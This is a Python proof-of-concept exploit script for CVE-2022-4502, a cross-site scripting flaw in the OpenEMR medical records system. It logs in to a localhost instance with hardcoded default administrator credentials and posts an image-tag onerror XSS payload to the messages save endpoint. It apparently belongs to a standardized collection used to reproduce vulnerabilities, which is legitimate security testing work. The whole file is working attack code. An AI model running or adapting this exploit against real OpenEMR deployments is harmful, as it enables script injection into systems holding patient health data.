#!/usr/bin/env python3
"""
[APP] OpenEMR 
[CVE] CVE-2022-4502 
[TYPE] XSS
[METHOD] POST
[CRASH_FIELDS] parameter
[TARGET_URL] http://localhost/openemr/interface/main/messages/save.php?action=process
[PARAMS] parameter={"xss":"<img%20src=x%20onerror=alert(290363)>"}
OpenEMR XSS vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then POST to /interface/main/messages/save.php
"""

import sys
import os
import json

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2022-4502 specific configuration
    base_url = 'http://localhost/openemr'
    login_path = '/interface/main/main_screen.php?auth=login&site=default'
    
    # Login payload based on the provided configuration
    login_payload = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': 'admin',
        'clearPass': 'pass',
        'languageChoice': '1'
    }
    
    # POC target URL and payload
    poc_url = 'http://localhost/openemr/interface/main/messages/save.php?action=process'
    poc_payload = {
        'parameter': '{"xss":"<img src=x onerror=alert(290363)>"}'  # XSS payload in JSON format
    }
    
    # Run authenticated POC test using the helper function
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_payload,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type'],
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
